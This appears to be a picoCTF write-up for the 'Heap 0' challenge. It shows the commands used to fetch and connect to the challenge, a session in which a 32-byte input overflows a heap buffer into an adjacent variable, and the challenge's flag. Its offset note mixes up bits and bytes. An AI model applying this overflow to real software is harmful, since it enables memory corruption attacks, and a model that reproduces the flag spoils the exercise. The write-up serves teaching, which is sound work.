# Heap 0

## Steps

```bash
wget https://artifacts.picoctf.net/c_tethys/28/chall https://artifacts.picoctf.net/c_tethys/28/chall.c

# connect and see what it dumps
nc tethys.picoctf.net 61786

# you can write to buffer, you see that the address is is only 208 (0xd0) - 0xb0 (176) = 32bits away
# write to buffer >= 4 bytes (32 bits) and you can run option 4, see below
```

## Example

```

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5c85f1d592b0  ->   pico
+-------------+----------------+
[*]   0x5c85f1d592d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice:
1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5c85f1d592b0  ->   FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+-------------+----------------+
[*]   0x5c85f1d592d0  ->                   <<< it's not set, now we wiped it
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_76775c7c}
```

## Flag

```
picoCTF{my_first_heap_overflow_76775c7c}
```
